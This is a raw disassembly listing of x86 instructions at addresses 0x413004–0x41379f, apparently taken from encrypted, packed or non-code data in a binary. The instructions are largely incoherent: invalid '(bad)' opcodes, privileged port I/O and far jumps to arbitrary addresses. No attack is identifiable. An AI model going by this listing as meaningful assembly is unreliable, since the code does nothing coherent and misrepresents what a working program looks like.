  413004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413005:	scas   eax,DWORD PTR es:[edi]
  413006:	push   es
  413007:	pop    edx
  413008:	scas   eax,DWORD PTR es:[edi]
  413009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300a:	test   eax,0x192c525a
  41300f:	repz adc ah,bl
  413012:	inc    ebp
  413014:	pop    ecx
  413015:	inc    esi
  413016:	test   eax,0x7dd6fdce
  41301b:	and    al,0xc8
  41301d:	dec    ebx
  41301e:	xor    al,0x94
  413020:	and    DWORD PTR [edi-0x10],ecx
  413023:	jmp    0x413022
  413025:	or     al,0xf2
  413027:	jo     0x413092
  413029:	scas   eax,DWORD PTR es:[edi]
  41302a:	mov    ds:0x316d492e,al
  41302f:	and    eax,0xd5d78d19
  413034:	sar    ebp,0x70
  413037:	bound  esp,QWORD PTR [eax]
  413039:	mov    bh,0x6b
  41303b:	int3   
  41303c:	out    dx,al
  41303d:	repz je 0x413028
  413040:	pop    eax
  413041:	pop    edx
  413042:	aaa    
  413043:	add    BYTE PTR [ebp+0x6c],ch
  413046:	adc    BYTE PTR [ebx+0x698336f3],cl
  41304c:	test   BYTE PTR [ebx],dh
  41304e:	push   ds
  41304f:	vcvtss2sd xmm5,xmm7,DWORD PTR [ecx-0x2ad52040]
  413057:	mov    al,ds:0x3f6cd766
  41305c:	jp     0x412ff7
  41305e:	mov    al,ds:0x5d519183
  413063:	xchg   esi,eax
  413064:	ficom  WORD PTR [ebp+0x175e1546]
  41306a:	cmc    
  41306b:	xchg   dh,cl
  41306d:	pop    edx
  41306e:	jmp    0x70a875f7
  413073:	mov    dl,0x95
  413075:	cs xchg ecx,eax
  413077:	sub    DWORD PTR [eax],esi
  413079:	into   
  41307a:	(bad)  
  41307b:	push   cs
  41307c:	arpl   WORD PTR [ebp-0x45],ax
  41307f:	mov    esi,0x9d328cb9
  413084:	inc    ecx
  413085:	loopne 0x4130d8
  413087:	cmp    esp,esi
  413089:	dec    ebx
  41308a:	fisub  DWORD PTR [edx-0x5aa82bea]
  413090:	mov    al,0xd6
  413092:	pop    ss
  413093:	imul   eax,DWORD PTR [eax+esi*1-0x18d8835a],0xb
  41309b:	leave  
  41309c:	test   eax,0xe0f8d6c4
  4130a1:	or     DWORD PTR [eax-0x3fa0b02d],ecx
  4130a7:	out    0x3a,al
  4130a9:	pop    ebx
  4130aa:	aas    
  4130ab:	dec    edi
  4130ac:	pop    esp
  4130ad:	or     al,0xaa
  4130af:	js     0x4130e7
  4130b1:	add    BYTE PTR [ecx+0x14141b61],bl
  4130b7:	inc    ecx
  4130b8:	or     ebx,DWORD PTR [esi]
  4130ba:	jbe    0x41308c
  4130bc:	jbe    0x41306d
  4130be:	mov    al,ds:0xc970a943
  4130c3:	pop    ebx
  4130c4:	test   eax,0xc528d987
  4130c9:	cmp    bh,BYTE PTR [ecx+0x12b583ee]
  4130cf:	fsubrp st(1),st
  4130d1:	inc    edi
  4130d2:	ror    DWORD PTR [ebx+0x1e],cl
  4130d5:	hlt    
  4130d6:	and    eax,0xb741ebe8
  4130db:	xor    DWORD PTR [ebx-0x6539c089],esi
  4130e1:	dec    edi
  4130e2:	mov    ecx,0x2240d1b5
  4130e7:	les    edx,FWORD PTR [edx]
  4130e9:	push   cs
  4130ea:	pop    ecx
  4130eb:	inc    ecx
  4130ec:	iret   
  4130ed:	in     al,dx
  4130ee:	pushw  cs
  4130f0:	cmp    dl,BYTE PTR [ebx-0x2d]
  4130f3:	mov    eax,ds:0x608d4e25
  4130f8:	mov    al,ds:0xc98f054c
  4130fd:	add    edi,DWORD PTR [ebx]
  4130ff:	lods   eax,DWORD PTR ds:[esi]
  413100:	inc    ebx
  413101:	xor    edx,DWORD PTR [esp+ecx*1]
  413104:	cld    
  413105:	sti    
  413106:	loopne 0x413119
  413108:	jp     0x4130e4
  41310a:	and    DWORD PTR fs:[edx-0x64],ebp
  41310e:	xchg   ecx,eax
  41310f:	jo     0x413104
  413111:	or     al,0x28
  413113:	das    
  413114:	test   al,0x25
  413116:	xor    edx,edx
  413118:	(bad)  
  413119:	out    dx,al
  41311a:	sbb    dl,BYTE PTR [eax-0x58d1e66a]
  413120:	xchg   esi,eax
  413121:	ins    BYTE PTR es:[edi],dx
  413122:	add    al,0x5f
  413124:	inc    edi
  413125:	sbb    BYTE PTR [ecx+ecx*8+0x5c],bl
  413129:	push   ss
  41312a:	ds daa 
  41312c:	xor    al,0x70
  41312e:	out    0xed,eax
  413130:	jmp    0x4ea6fe8b
  413135:	mov    dl,BYTE PTR [ecx-0x5]
  413138:	inc    eax
  413139:	ret    0x6c19
  41313c:	and    BYTE PTR [esi],bh
  41313e:	mov    ds,ebp
  413140:	loopne 0x4131a5
  413142:	outs   dx,BYTE PTR ds:[esi]
  413143:	xchg   esi,eax
  413144:	jg     0x4130d9
  413146:	mov    DWORD PTR [edi+0x70bd6ad3],edi
  41314c:	cmp    esp,DWORD PTR [eax+0x1f]
  41314f:	cmp    DWORD PTR [eax-0xeee05f1],0x9fede0ca
  413159:	bound  esp,QWORD PTR [eax-0x1c]
  41315c:	call   0x5bfb:0x4c068ca4
  413163:	sub    al,0x99
  413165:	xor    edi,esp
  413167:	fs ret 0x7c95
  41316b:	out    0x64,al
  41316d:	or     al,0x65
  41316f:	xchg   DWORD PTR [ecx+0x3e],esp
  413172:	pusha  
  413173:	scas   eax,DWORD PTR es:[edi]
  413174:	aad    0xbc
  413176:	std    
  413177:	imul   eax,ecx,0x8ccb1af5
  41317d:	xlat   BYTE PTR ds:[ebx]
  41317e:	ja     0x413116
  413180:	xchg   ecx,eax
  413181:	sbb    al,0x7f
  413183:	or     DWORD PTR [eax],esi
  413185:	ret    
  413186:	jl     0x413131
  413188:	pusha  
  413189:	ret    
  41318a:	jge    0x413137
  41318c:	dec    edx
  41318d:	repz push esi
  41318f:	sbb    eax,0x9777bf5c
  413194:	outs   dx,BYTE PTR ds:[esi]
  413195:	mov    al,0x83
  413197:	xchg   esi,eax
  413198:	mov    cl,0x9b
  41319a:	nop
  41319b:	inc    ebp
  41319c:	jmp    0x8110:0xfcb25e7e
  4131a3:	cli    
  4131a4:	jg     0x413197
  4131a6:	scas   eax,DWORD PTR es:[edi]
  4131a7:	cmp    BYTE PTR [ebx-0x38],ah
  4131aa:	xor    ah,dh
  4131ac:	fstp   QWORD PTR [ebx-0x25]
  4131af:	out    dx,al
  4131b0:	dec    edi
  4131b1:	cmc    
  4131b2:	or     ah,ch
  4131b4:	aad    0x61
  4131b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b7:	adc    cl,dh
  4131b9:	cmp    eax,0x862ff532
  4131be:	xchg   edi,eax
  4131bf:	push   ecx
  4131c0:	or     al,0x2d
  4131c2:	je     0x4131c7
  4131c4:	inc    esp
  4131c5:	inc    esp
  4131c6:	adc    al,0x6a
  4131c8:	cld    
  4131c9:	dec    eax
  4131ca:	dec    eax
  4131cb:	mov    edx,0xa9bca655
  4131d0:	cmp    DWORD PTR [ebx-0x60],ecx
  4131d3:	addr16 xor ebx,esp
  4131d6:	cmp    esi,DWORD PTR [eax-0x1f]
  4131d9:	lds    esi,FWORD PTR [edi-0x750e8911]
  4131df:	retf   
  4131e0:	pop    ebp
  4131e1:	imul   edi,DWORD PTR [ebx],0x14
  4131e4:	test   BYTE PTR [eax+0x13],bl
  4131e7:	popf   
  4131e8:	sub    al,0xf4
  4131ea:	repnz loop 0x413199
  4131ed:	sar    BYTE PTR [esi-0x1f],0x83
  4131f1:	iret   
  4131f2:	pushf  
  4131f3:	push   ecx
  4131f4:	cmp    BYTE PTR [eax+0x10],bl
  4131f7:	arpl   bp,dx
  4131f9:	loopne 0x4131ea
  4131fb:	dec    esi
  4131fc:	out    0x14,al
  4131fe:	mov    eax,eax
  413200:	cmp    esp,eax
  413202:	mov    eax,DWORD PTR [ebx-0x56ee36b3]
  413208:	inc    edi
  413209:	xchg   esp,eax
  41320a:	push   eax
  41320b:	or     BYTE PTR ds:0x596f86d6,dl
  413211:	lds    ebx,FWORD PTR [ecx+0x15]
  413214:	jle    0x41326d
  413216:	or     ebp,DWORD PTR [ecx-0x3cd5b25a]
  41321c:	in     al,dx
  41321d:	fwait
  41321e:	loopne 0x413280
  413220:	(bad)  
  413222:	outs   dx,BYTE PTR ds:[esi]
  413223:	pop    ss
  413224:	ss dec edx
  413226:	sbb    esi,DWORD PTR [edi-0x14]
  413229:	sbb    eax,0xd02fcf6a
  41322e:	ror    BYTE PTR [esi+0x9a64d60],cl
  413234:	add    al,0x1f
  413236:	dec    edx
  413237:	push   es
  413238:	(bad)  
  413239:	(bad)  
  41323b:	nop
  41323c:	cdq    
  41323d:	push   edi
  41323e:	loope  0x41326f
  413240:	mov    dh,0x27
  413242:	inc    esi
  413243:	scas   eax,DWORD PTR es:[edi]
  413244:	and    eax,0x31af162d
  413249:	push   esp
  41324a:	ffreep st(0)
  41324c:	fwait
  41324d:	jmp    0xa9573202
  413252:	es jl  0x4132b2
  413255:	add    al,0x9
  413257:	mov    ebp,0x61b0e5d1
  41325c:	sahf   
  41325d:	add    edx,ebp
  41325f:	push   esp
  413260:	inc    ebp
  413261:	xlat   BYTE PTR ds:[ebx]
  413262:	mov    ebp,0xdb4b8ccc
  413267:	cmp    esp,DWORD PTR [eax+edi*8+0x6946d780]
  41326e:	and    ah,0xea
  413271:	mov    WORD PTR [ebp+ebp*2-0x2a],cs
  413275:	mov    cl,0xc5
  413277:	test   BYTE PTR [eax-0x30],al
  41327a:	sub    cl,BYTE PTR [ebx-0x4aa81e9f]
  413280:	mov    al,BYTE PTR [eax-0x4eb894b9]
  413286:	shr    edx,0xcf
  413289:	aas    
  41328a:	std    
  41328b:	pop    ecx
  41328c:	sbb    ch,BYTE PTR fs:[esi+0x155fd1be]
  413293:	(bad)  
  413294:	jp     0x413315
  413296:	imul   ax,bp,0xffcd
  41329a:	mov    esi,0x188c6e9
  41329f:	neg    BYTE PTR [edi+0x6b]
  4132a2:	sahf   
  4132a3:	push   esp
  4132a4:	sbb    BYTE PTR [ecx],al
  4132a6:	cld    
  4132a7:	sub    eax,0x4632f36f
  4132ac:	or     edi,ebp
  4132ae:	adc    eax,0x689b2c25
  4132b3:	gs (bad) 
  4132b6:	cdq    
  4132b7:	jmp    0x4ee2:0xf54f159e
  4132be:	test   BYTE PTR [esi],ch
  4132c0:	retf   
  4132c1:	cdq    
  4132c2:	(bad)  
  4132c3:	call   0x6208:0x865e5e5f
  4132ca:	adc    esi,ebp
  4132cc:	xchg   ecx,eax
  4132cd:	aas    
  4132ce:	stc    
  4132cf:	mov    bh,0xc6
  4132d1:	inc    esp
  4132d2:	pop    DWORD PTR [ebx+ebp*8-0x11]
  4132d6:	xchg   edx,eax
  4132d7:	pop    ecx
  4132d8:	xor    BYTE PTR [edi+ebp*8-0xc0aee0a],al
  4132df:	sbb    DWORD PTR [eax+0x3d],esi
  4132e2:	pop    esp
  4132e3:	mov    ebx,0x6f9f4a65
  4132e8:	inc    eax
  4132e9:	jne    0x413285
  4132eb:	ins    BYTE PTR es:[edi],dx
  4132ec:	(bad)  
  4132ed:	xchg   ecx,eax
  4132ee:	imul   edi,DWORD PTR [edi-0xa],0x4223da57
  4132f5:	adc    cx,WORD PTR [edi]
  4132f8:	daa    
  4132f9:	dec    edx
  4132fa:	lods   al,BYTE PTR ds:[esi]
  4132fb:	ds popa 
  4132fd:	xchg   esi,eax
  4132fe:	dec    ebp
  4132ff:	mov    eax,0xc6c5bd1f
  413304:	push   ecx
  413305:	xchg   DWORD PTR [esi],edi
  413307:	rcl    DWORD PTR [edi],cl
  413309:	xchg   edi,eax
  41330a:	leave  
  41330b:	mov    esi,0x536a5037
  413310:	add    eax,0xa1623ec6
  413315:	mov    al,ds:0xdd7f6372
  41331a:	pop    edi
  41331b:	pushf  
  41331c:	(bad)  
  41331d:	shl    al,1
  41331f:	or     BYTE PTR [ecx-0x7c],0x80
  413323:	fldenv [esi-0x7db4c9da]
  413329:	xchg   edx,eax
  41332a:	xor    eax,0x5fbbb84
  41332f:	in     eax,0x9d
  413331:	and    eax,0x74489cb9
  413336:	mov    ecx,0x77af4b25
  41333b:	pop    ss
  41333c:	fld    QWORD PTR [ebp-0x2093d02d]
  413342:	adc    BYTE PTR [edi],bh
  413344:	sbb    eax,0x63da7b84
  413349:	xor    DWORD PTR [esi+0x2dfd94de],esi
  41334f:	aad    0x3f
  413351:	sub    al,0x47
  413353:	xchg   esp,eax
  413354:	(bad)  
  413355:	xor    BYTE PTR [esi+0xf],dh
  413358:	out    dx,al
  413359:	xor    eax,0xd3c8c4aa
  41335e:	push   cs
  41335f:	scas   al,BYTE PTR es:[edi]
  413360:	ins    DWORD PTR es:[edi],dx
  413361:	dec    esp
  413362:	mov    ebx,0xbb80dcb9
  413367:	aam    0x40
  413369:	lahf   
  41336a:	and    edx,DWORD PTR [eax]
  41336c:	out    dx,eax
  41336d:	pop    edx
  41336e:	cmp    ebx,0xfffffff4
  413371:	inc    edi
  413372:	push   cs
  413373:	in     eax,dx
  413374:	mov    edi,0x949f5d71
  413379:	cmp    eax,0xf289ac32
  41337e:	and    ecx,ebp
  413380:	push   ebp
  413381:	(bad)  
  413382:	or     al,0xe0
  413384:	xchg   ebp,eax
  413385:	in     al,0x9f
  413387:	dec    ecx
  413388:	xlat   BYTE PTR ds:[ebx]
  413389:	bound  ecx,QWORD PTR [edx]
  41338b:	sbb    DWORD PTR [edi-0x52],ecx
  41338e:	sbb    eax,0xf20b2cc0
  413393:	(bad)  
  413394:	pushf  
  413395:	iret   
  413396:	lods   al,BYTE PTR ds:[esi]
  413397:	addr16 mov ds:0x1ab9,al
  41339b:	lock push ecx
  41339d:	div    DWORD PTR [esi]
  41339f:	push   esi
  4133a0:	adc    DWORD PTR [eax-0x4bb733bc],ebx
  4133a6:	adc    eax,0x4fecada
  4133ab:	push   edx
  4133ac:	pop    ebx
  4133ad:	add    edx,DWORD PTR [esi-0x6c]
  4133b0:	fsub   DWORD PTR [ecx-0x55]
  4133b3:	ins    BYTE PTR es:[edi],dx
  4133b4:	lahf   
  4133b5:	inc    edx
  4133b6:	aad    0xf3
  4133b8:	shl    BYTE PTR [esi],0x50
  4133bb:	mov    edi,0x92b17816
  4133c0:	into   
  4133c1:	pop    eax
  4133c2:	pop    ebx
  4133c3:	jge    0x4133a1
  4133c5:	sahf   
  4133c6:	lods   eax,DWORD PTR ds:[esi]
  4133c7:	aaa    
  4133c8:	cld    
  4133c9:	adc    BYTE PTR [ebx-0x6f],al
  4133cc:	dec    ebx
  4133cd:	hlt    
  4133ce:	inc    edx
  4133cf:	dec    edi
  4133d0:	pop    ds
  4133d1:	add    al,bl
  4133d3:	pusha  
  4133d4:	retf   
  4133d5:	arpl   WORD PTR [ecx-0x70],bx
  4133d8:	lods   eax,DWORD PTR ds:[esi]
  4133d9:	sub    eax,0xb9afb9cd
  4133de:	aas    
  4133df:	pop    ebx
  4133e0:	aam    0xf4
  4133e2:	hlt    
  4133e3:	mov    dh,0x36
  4133e5:	mov    ecx,0x540baf1
  4133ea:	scas   eax,DWORD PTR es:[edi]
  4133eb:	(bad)  
  4133ec:	push   0xd6824109
  4133f1:	adc    DWORD PTR [ebx],esi
  4133f3:	es aam 0xf4
  4133f6:	inc    edi
  4133f7:	adc    DWORD PTR [eax+eiz*1-0x73679056],ebp
  4133fe:	inc    ebx
  413400:	lock jle 0x4133cd
  413403:	rcr    DWORD PTR [ebx+0x48],0xce
  413407:	lods   al,BYTE PTR ds:[esi]
  413409:	mov    esi,DWORD PTR [edi+0x1346a8c7]
  41340f:	pop    edx
  413410:	in     eax,dx
  413411:	loopne 0x413407
  413413:	adc    ebp,0xffffff98
  413416:	mov    WORD PTR [edi],gs
  413418:	jnp    0x4133c2
  41341a:	add    ebx,DWORD PTR [edx+0x2ebc29d7]
  413420:	sub    edi,edx
  413422:	pop    ebp
  413423:	xchg   DWORD PTR [edi],edx
  413425:	or     ebp,DWORD PTR [ebx-0xf]
  413428:	push   cs
  413429:	jp     0x413435
  41342b:	retf   0xe36d
  41342e:	push   ebp
  41342f:	(bad)  
  413430:	sbb    eax,0xc2883a2f
  413435:	into   
  413436:	scas   al,BYTE PTR es:[edi]
  413437:	lds    ebx,FWORD PTR [ebp+0x5d]
  41343a:	cld    
  41343b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41343c:	outs   dx,DWORD PTR ds:[esi]
  41343d:	jb     0x41344a
  41343f:	fbstp  TBYTE PTR [edx+0x16134042]
  413445:	fcom   QWORD PTR [edx-0x7870ab12]
  41344b:	outs   dx,DWORD PTR ds:[esi]
  41344c:	mov    eax,ds:0x7891c5fe
  413451:	lods   eax,DWORD PTR ds:[esi]
  413452:	cmp    BYTE PTR [ebp+0x10fa0141],ah
  413458:	xor    DWORD PTR [edx],0xfce79f16
  41345e:	or     al,0x11
  413460:	ror    ebp,0xa7
  413463:	and    eax,0xb49abf1f
  413468:	or     ecx,DWORD PTR [edi+ebp*4+0x3a3c4823]
  41346f:	xchg   edi,eax
  413470:	cmp    ah,0xc5
  413473:	out    dx,al
  413474:	cmp    al,0xbb
  413476:	pop    esi
  413477:	adc    DWORD PTR [eax+0x20cd4c2d],eax
  41347d:	in     eax,0x1
  41347f:	out    0x9c,eax
  413481:	add    DWORD PTR [edi+esi*2],edi
  413484:	aas    
  413485:	sti    
  413486:	add    eax,0xf634fa6c
  41348b:	pop    ds
  41348c:	pop    ecx
  41348d:	ja     0x413483
  41348f:	dec    eax
  413490:	or     DWORD PTR [eax+0x10],ebp
  413493:	repz inc eax
  413495:	and    DWORD PTR [ebx],0xe7c65f4c
  41349b:	adc    DWORD PTR [ecx],ebx
  41349d:	bnd jle 0x41342e
  4134a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a1:	call   DWORD PTR [esi]
  4134a3:	mov    esi,0x7254a2cf
  4134a8:	dec    eax
  4134a9:	loopne 0x4134f7
  4134ab:	sahf   
  4134ac:	popf   
  4134ad:	div    DWORD PTR [esi+0x444c804e]
  4134b3:	in     eax,0x92
  4134b5:	push   cs
  4134b6:	adc    BYTE PTR [edx+0x15185d33],bh
  4134bc:	mov    dh,0xeb
  4134be:	aam    0x22
  4134c0:	mul    DWORD PTR [ecx]
  4134c2:	jmp    0x3ac5f8eb
  4134c7:	push   edi
  4134c8:	jp     0x413453
  4134ca:	lock pop ds
  4134cc:	and    eax,DWORD PTR [edi-0x6b]
  4134cf:	das    
  4134d0:	jae    0x413509
  4134d2:	pop    eax
  4134d3:	inc    ebp
  4134d4:	out    0xe7,eax
  4134d6:	imul   eax,DWORD PTR [ecx+0x5e4a90ca],0xffffffeb
  4134dd:	push   ebx
  4134de:	int3   
  4134df:	out    dx,eax
  4134e0:	pop    edx
  4134e1:	or     eax,0xe8caeec5
  4134e6:	jge    0x4134f6
  4134e8:	mov    esi,0x5538b490
  4134ed:	mov    ds:0x38093f4d,eax
  4134f2:	jg     0x413543
  4134f4:	out    0xa7,al
  4134f6:	push   cs
  4134f7:	push   0xffffffe4
  4134f9:	(bad)  
  4134fa:	out    0x1a,al
  4134fc:	in     al,dx
  4134fd:	fistp  QWORD PTR ss:[ecx+edx*2]
  413501:	aaa    
  413502:	inc    ebp
  413503:	inc    eax
  413504:	and    al,0x7e
  413506:	and    DWORD PTR [edi+0x2e],edi
  413509:	jl     0x41357f
  41350b:	mov    ds:0xd05aca99,eax
  413510:	pop    ss
  413511:	les    ebx,FWORD PTR [eax+eax*8+0x49c8dbab]
  413518:	ja     0x413563
  41351a:	mov    edi,DWORD PTR [esi]
  41351c:	add    BYTE PTR [ecx+edx*8-0x6d03e5db],0x38
  413524:	or     bh,dh
  413526:	mul    BYTE PTR [edx]
  413528:	in     al,0xe6
  41352a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41352b:	into   
  41352c:	and    eax,DWORD PTR [ebx+eax*4]
  41352f:	mov    ebp,0x2e1d243e
  413534:	mov    eax,ds:0x9d55760a
  413539:	aad    0xa1
  41353b:	loopne 0x41356f
  41353d:	adc    ecx,DWORD PTR [edx]
  41353f:	lods   eax,DWORD PTR ds:[esi]
  413540:	fs aaa 
  413542:	xchg   edi,eax
  413543:	push   esi
  413544:	add    cl,bh
  413546:	cmp    bl,ah
  413548:	dec    ebp
  413549:	pop    edx
  41354a:	push   DWORD PTR [edx*1-0x23ad6230]
  413551:	mov    gs,WORD PTR [ecx]
  413553:	jo     0x41354b
  413555:	xchg   DWORD PTR [ebp-0x44],ecx
  413558:	xchg   esp,eax
  413559:	or     DWORD PTR [edx+eiz*1],edi
  41355c:	xchg   esp,eax
  41355d:	mov    edi,0xd8ceaa97
  413562:	shr    BYTE PTR [ebx+esi*2],0x92
  413566:	(bad)  
  413567:	out    dx,al
  413568:	cdq    
  413569:	dec    ebp
  41356a:	jp     0x4135c6
  41356c:	leave  
  41356d:	in     al,0xbd
  41356f:	and    DWORD PTR [ebp+0x61f042cd],0xffffff8d
  413576:	ficomp WORD PTR [edx-0x5c6fe035]
  41357c:	stos   DWORD PTR es:[edi],eax
  41357d:	and    ebx,ebx
  41357f:	aaa    
  413580:	fcmovbe st,st(5)
  413582:	adc    bl,bh
  413584:	inc    eax
  413585:	test   ebx,esp
  413587:	or     eax,0xb5e91fce
  41358c:	das    
  41358d:	mov    ch,0xc2
  41358f:	and    al,0x4f
  413591:	outs   dx,BYTE PTR ds:[esi]
  413592:	mov    DWORD PTR [ecx-0x56],ebp
  413595:	ja     0x41358b
  413597:	mov    dl,ah
  413599:	sbb    al,0x21
  41359b:	mov    ch,0xb4
  41359d:	or     BYTE PTR [edx],dl
  41359f:	push   eax
  4135a0:	(bad)  
  4135a1:	in     al,dx
  4135a2:	pop    ecx
  4135a3:	and    al,0xf7
  4135a5:	inc    esi
  4135a6:	jae    0x413589
  4135a8:	mov    ah,0x52
  4135aa:	push   esi
  4135ab:	das    
  4135ac:	push   ds
  4135ad:	ds in  eax,dx
  4135af:	out    0x10,al
  4135b1:	inc    esp
  4135b2:	mov    ebp,0xf2c60531
  4135b7:	adc    dh,ah
  4135b9:	sbb    ebp,ecx
  4135bb:	sbb    eax,0x7be94f69
  4135c0:	cmp    al,0xee
  4135c2:	dec    esp
  4135c3:	dec    esi
  4135c4:	stos   DWORD PTR es:[edi],eax
  4135c5:	lods   al,BYTE PTR ds:[esi]
  4135c6:	jge    0x41360d
  4135c8:	mov    ?,WORD PTR [ebp-0x75d82078]
  4135ce:	cmp    al,0xd2
  4135d0:	fsubr  st,st(6)
  4135d2:	mov    ch,0xf3
  4135d4:	mov    ebp,0x4bf8c46
  4135d9:	callw  0xb15d
  4135dd:	clc    
  4135de:	cmp    cl,BYTE PTR ds:0x23dadf26
  4135e4:	and    DWORD PTR [eax],ebp
  4135e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135e7:	in     eax,dx
  4135e8:	aad    0x84
  4135ea:	add    al,0x63
  4135ec:	mov    al,ds:0xa4e33203
  4135f1:	sbb    ebx,esp
  4135f3:	or     BYTE PTR [esi-0x8],cl
  4135f6:	pop    ecx
  4135f8:	mov    ch,0x87
  4135fa:	dec    eax
  4135fb:	ficom  DWORD PTR [esi-0x738be645]
  413601:	xor    bl,BYTE PTR [edx]
  413603:	mov    al,ds:0x6ce7e409
  413608:	rol    BYTE PTR [esi+edi*2+0x4],0xa2
  41360d:	aas    
  41360e:	mov    dh,0x26
  413610:	pop    ecx
  413611:	popf   
  413612:	inc    ebp
  413613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413614:	std    
  413615:	out    0x46,eax
  413617:	cli    
  413618:	inc    esi
  413619:	pop    edx
  41361a:	and    al,0x7f
  41361c:	pop    edi
  41361d:	mov    esi,0x7f799863
  413622:	dec    edi
  413623:	retf   
  413624:	pushf  
  413625:	add    eax,0x3bd9e22d
  41362a:	mov    ds:0xf9e8521e,al
  41362f:	daa    
  413630:	xchg   esp,eax
  413631:	adc    ecx,DWORD PTR [ebx]
  413633:	(bad)  
  413634:	jns    0x413613
  413636:	repnz pop edi
  413638:	in     eax,dx
  413639:	sahf   
  41363a:	call   0xf3229a5f
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	push   ebp
  413641:	gs call 0xf08b7a63
  413647:	fwait
  413648:	mov    ds:0xb2d33805,ax
  41364e:	vcvtss2sd xmm6,xmm6,xmm1
  413652:	mov    ebp,0xe4593a
  413657:	adc    esp,DWORD PTR [edx+0x2a]
  41365a:	js     0x413641
  41365c:	call   0x4788:0x6d40f693
  413663:	and    al,0xcc
  413665:	pusha  
  413666:	outs   dx,DWORD PTR ds:[esi]
  413667:	pop    esp
  413668:	xchg   esp,eax
  413669:	ja     0x41361a
  41366b:	ins    DWORD PTR es:[edi],dx
  41366c:	push   es
  41366d:	(bad)
  413671:	ins    BYTE PTR es:[edi],dx
  413672:	xchg   edx,eax
  413673:	inc    edi
  413674:	adc    eax,0x585dbfa9
  413679:	pop    ebp
  41367a:	sub    dh,BYTE PTR [ecx-0x5ac1d4a2]
  413680:	xchg   ecx,eax
  413681:	push   esp
  413682:	loop   0x413619
  413684:	(bad)  
  413685:	adc    esi,esi
  413687:	sub    ebx,DWORD PTR [edx-0x20]
  41368a:	push   ebx
  41368b:	sub    eax,0x344f0118
  413690:	mov    ds:0x113e0ed,al
  413695:	sti    
  413696:	bound  ecx,QWORD PTR [edx-0x74]
  413699:	cli    
  41369a:	push   ss
  41369b:	ror    DWORD PTR [ecx+ecx*8-0x50],0x2
  4136a0:	enter  0xb847,0x9b
  4136a4:	sbb    bh,BYTE PTR [ebx+0x44ea535f]
  4136aa:	and    edi,DWORD PTR [edx+edx*2-0x5a]
  4136ae:	mov    esi,0xaca045bc
  4136b3:	jmp    0x1d1cefc3
  4136b8:	call   0x605e1563
  4136bd:	daa    
  4136be:	mov    cl,0x22
  4136c0:	mov    eax,0x6b717ec5
  4136c5:	lock mov bl,0x4e
  4136c8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4136ca:	retf   
  4136cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136cc:	pusha  
  4136cd:	jb     0x41368c
  4136cf:	lahf   
  4136d0:	xchg   esi,eax
  4136d1:	push   edx
  4136d2:	scas   eax,DWORD PTR es:[edi]
  4136d3:	inc    esi
  4136d4:	jmp    0xd7cc:0xef606724
  4136db:	push   esp
  4136dc:	int    0xf4
  4136de:	jnp    0x4136f3
  4136e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136e1:	inc    esp
  4136e2:	mov    ah,0x69
  4136e4:	idiv   BYTE PTR ds:0xe8c82434
  4136ea:	int    0x2b
  4136ec:	test   al,0xab
  4136ee:	add    DWORD PTR [esi+0x5f8ad56d],edx
  4136f4:	push   ds
  4136f5:	mov    DWORD PTR [ebx+0x54aa8900],edi
  4136fb:	out    dx,eax
  4136fc:	ret    
  4136fd:	mov    ecx,0x5ec38257
  413702:	cwde   
  413703:	nop
  413704:	(bad)  
  413705:	pop    ss
  413706:	(bad)  
  413707:	lods   eax,DWORD PTR ds:[esi]
  413708:	fiadd  WORD PTR [ebx-0x3c5e3b6a]
  41370e:	(bad)  
  41370f:	mov    ch,0xeb
  413711:	ins    DWORD PTR es:[edi],dx
  413712:	jl     0x413775
  413714:	push   ss
  413715:	mov    esp,0x2489f3bc
  41371a:	dec    ecx
  41371b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41371c:	sub    BYTE PTR [eax],bh
  41371e:	inc    edx
  41371f:	(bad)  
  413720:	hlt    
  413721:	mov    eax,0x5d504774
  413726:	into   
  413727:	push   ecx
  413728:	inc    esi
  413729:	push   eax
  41372a:	aaa    
  41372b:	ret    0x7a46
  41372e:	sti    
  41372f:	inc    esp
  413730:	push   ebp
  413731:	dec    edx
  413732:	pop    esp
  413733:	pop    eax
  413734:	adc    al,dl
  413736:	adc    esi,DWORD PTR [eax]
  413738:	fsubr  QWORD PTR [eax+0x444eaf55]
  41373e:	xor    ebp,DWORD PTR [edi]
  413740:	mov    cl,0x2
  413742:	sub    BYTE PTR [ecx],dl
  413744:	push   esi
  413745:	sbb    eax,0xeb6e5256
  41374a:	out    dx,eax
  41374b:	mov    dl,0xcc
  41374d:	loop   0x413747
  41374f:	mov    ss,WORD PTR [eax+0x44]
  413752:	outs   dx,BYTE PTR ds:[esi]
  413753:	xchg   ecx,eax
  413754:	or     dl,al
  413756:	pusha  
  413757:	and    ah,BYTE PTR [esi]
  413759:	leave  
  41375a:	cmp    cl,BYTE PTR [ecx+0x29fa84ed]
  413760:	lahf   
  413761:	aas    
  413762:	jns    0x41370c
  413764:	cmp    BYTE PTR [ebx+0x75],ch
  413767:	xor    bl,BYTE PTR [edx]
  413769:	or     ch,dh
  41376b:	add    eax,0x8612fca5
  413770:	adc    esi,DWORD PTR [ebx-0x750894ac]
  413776:	stos   DWORD PTR es:[edi],eax
  413777:	ja     0x413769
  413779:	pop    ss
  41377a:	or     eax,0x96876c5b
  41377f:	outs   dx,BYTE PTR ds:[esi]
  413780:	jmp    0x720e:0xc5029b82
  413787:	or     ebp,DWORD PTR [ebp+ebp*2-0x47]
  41378b:	xchg   edx,eax
  41378c:	in     eax,0xa2
  41378e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41378f:	fild   DWORD PTR [ebp-0xc]
  413792:	pop    edx
  413793:	pop    edi
  413794:	icebp  
  413795:	push   ebp
  413796:	lods   eax,DWORD PTR ds:[esi]
  413797:	sti    
  413798:	mov    bh,0x19
  41379a:	sahf   
  41379b:	push   esi
  41379c:	mov    dh,ch
  41379e:	fwait
  41379f:	leave  
